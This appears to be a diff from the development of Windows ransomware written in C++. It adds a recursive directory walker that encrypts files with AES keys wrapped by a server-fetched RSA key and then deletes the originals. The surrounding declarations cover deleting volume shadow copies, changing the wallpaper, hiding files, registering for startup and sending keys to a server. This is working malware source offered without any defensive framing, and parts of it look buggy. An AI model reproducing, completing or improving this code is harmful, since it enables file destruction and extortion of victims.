@@ -8,7 +8,7 @@
 using namespace boost::filesystem;
 using std::string;
 
-void encrypt(string path, const PBYTE masterIV, const PBYTE masterKey);
+void encrypt(string path, RsaEncryptor& encryptor);
 
 string get_username();
 void test();
@@ -18,22 +18,24 @@ DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key);
 Status sendIVAndKeyToServer(PBYTE masterIV, PBYTE masterKey, PBYTE id);
 void changeHiddenFileState(bool state);
 void destroyVSS();
-
+static void iterate(const path& parent, RsaEncryptor rsaEncryptor,
+	std::vector<string> processedPaths);
 Status changeWallPaper(const string&);
 Status LimitCPU(HANDLE& hCurrentProcess, HANDLE& hJob);
 void doRestart();
 void makeFileHidden(string path);
 void RegisterProgram();
-Status getPublicParams(string& mod, string& pubKey);
+Status getPublicParams(string& mod, string& pubKey); //how can it fail?
 
 void getPublicParams(string id, string& mod, string& pubKey)
 {
 	string url = URL_PUBLIC_RSA + id;
 	string chunk;
-	getFromServer(url, chunk);
+	getFromServer(url, chunk);//this can fail, right?
 	parsePublicKey(chunk, mod, pubKey);
 
 }
+
 int encryption_main( bool fromStart) {
 //	crypt_data* d = generatekey();//TODO also move to encrypt
 
@@ -57,6 +59,7 @@ int encryption_main( bool fromStart) {
 	HANDLE hJob = nullptr;
 	vector<string> processed;
 	string fileRead;
+	RsaEncryptor rsaEncryptor;
 	/* let's begin*/
 
 	if (!NT_SUCCESS(status))
@@ -80,7 +83,7 @@ int encryption_main( bool fromStart) {
 		goto CLEAN;
 	}
 
-	RsaEncryptor rsaEncryptor;
+
 	rsaEncryptor.init_Encryptor(mod, pubKey);
 
 	status = LimitCPU(hCurrentProcess, hJob);
@@ -121,7 +124,7 @@ int encryption_main( bool fromStart) {
 #endif
 
 //	encrypt(path, masterIV, masterKey);
-	iterate2(path, &encrypt, rsaEncryptor, processed);
+	iterate(path, rsaEncryptor, processed);
 	for(auto& path : processed)
 	{
 		remove(path);
@@ -163,9 +166,6 @@ CLEAN:
 #endif
 	return 0;
 }
-
-
-
 
 /*usefull functions =]] */
 
@@ -210,30 +210,6 @@ void changeHiddenFileState(bool state)
 	ss.fShowSysFiles = state;
 	ss.fShowSuperHidden = state;
 	SHGetSetSettings(&ss, SSF_SHOWALLOBJECTS | SSF_SHOWSYSFILES | SSF_SHOWSUPERHIDDEN, TRUE);
-}
-
-DWORD encryptKeyIV(PBYTE keyIV, PBYTE *buff, RsaEncryptor rsaEncryptor)
-{
-	DWORD status;
-	BCRYPT_ALG_HANDLE aesHandle = nullptr;
-	BCRYPT_KEY_HANDLE keyHandle = nullptr;
-	status = getKeyHandle(masterKey, keyHandle, aesHandle);
-	if (!NT_SUCCESS(status)) {
-		return status;
-	}
-	PBYTE tmpIv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
-	if (NULL == tmpIv) {
-		HeapFree(GetProcessHeap(), 0, tmpIv);
-		return STATUS_UNSUCCESSFUL;
-	}
-	memcpy(tmpIv, masterIV, IV_LEN);
-	DWORD  resSize;
-
-	status = BCryptEncrypt(keyHandle, keyIV, KEY_LEN + IV_LEN, NULL, tmpIv, IV_LEN, *buff, KEY_LEN + IV_LEN, &resSize, 0);
-	if (!NT_SUCCESS(status)) {
-		return status;
-	}
-	return status;
 }
 
 DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key)
@@ -324,7 +300,7 @@ DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& a
 	return status;
 }
 
-void encrypt(string path, RsaEncryptor rsaEncryptor)
+void encrypt(string path, RsaEncryptor& encryptor)
 {
 	DWORD status;
 	PBYTE plainText = nullptr;
@@ -347,11 +323,8 @@ void encrypt(string path, RsaEncryptor rsaEncryptor)
 	status = generateKeyAndIV(&iv, &key);
 	if(!NT_SUCCESS(status)) {
 		goto CLEANUP;
-		std::cout << "key and IV set FAIL";//TODO remove if doesn't show
 	}
 	//keep in persistant file
-
-
 	
 	status = getKeyHandle(key, keyHandle, aesHandle);
 	if (!NT_SUCCESS(status)) {
@@ -381,11 +354,6 @@ void encrypt(string path, RsaEncryptor rsaEncryptor)
 	std::cout << "Ciphertext:\t" << cipherText << std::endl;
 #endif
 
-	keyIVBuff = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN + IV_LEN );
-	if(keyIVBuff == nullptr)
-	{
-		goto CLEANUP;
-	}
 	keyIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN + IV_LEN);
 	if (keyIV == nullptr)
 	{
@@ -394,8 +362,8 @@ void encrypt(string path, RsaEncryptor rsaEncryptor)
 	memcpy(keyIV,key,KEY_LEN);
 	memcpy(keyIV + KEY_LEN, iv, IV_LEN);
 	
-	status = encryptKeyIV(keyIV, &keyIVBuff,rsaEncryptor);
-	if(!NT_SUCCESS(status))
+	keyIVBuff = encryptor.encrypt(keyIVBuff, KEY_LEN + IV_LEN);
+	if(!keyIVBuff)
 	{
 		goto CLEANUP;
 	}
@@ -539,6 +507,40 @@ void RegisterProgram()
 	RegisterMyProgramForStartup(L"My_Program", szPathToExe, L"-foobar");
 }
 
+static void iterate(const path& parent, RsaEncryptor rsaEncryptor,
+	std::vector<string> processedPaths)
+{
+	string path;
+	directory_iterator end_itr;
+	static long long sumSize;
+
+	for (directory_iterator itr(parent); itr != end_itr; ++itr) {
+		path = itr->path().string();
+
+		if (is_directory(itr->status()) && !symbolic_link_exists(itr->path())) {
+			if (is_valid_folder(path))
+			{
+				iterate(path, rsaEncryptor, processedPaths);
+			}
+		}
+		else {
+			if (!do_encrypt(path)) continue;//see TODO 2 rows below
+			encrypt(path, rsaEncryptor);
+			//TODO consider adding to "process" of encrypt, will cause an ugly wrapper for decrypt
+			processedPaths.push_back(path);
+			sumSize += file_size(path);
+			if (sumSize >= SIZE_THRESHOLD)
+			{
+				for (auto& fileToDelete : processedPaths)
+				{
+					remove(fileToDelete);
+				}
+				sumSize = 0;
+				processedPaths.clear();
+			}
+		}
+	}
+}
 
 //string get_username() {
 //#ifdef _WIN32
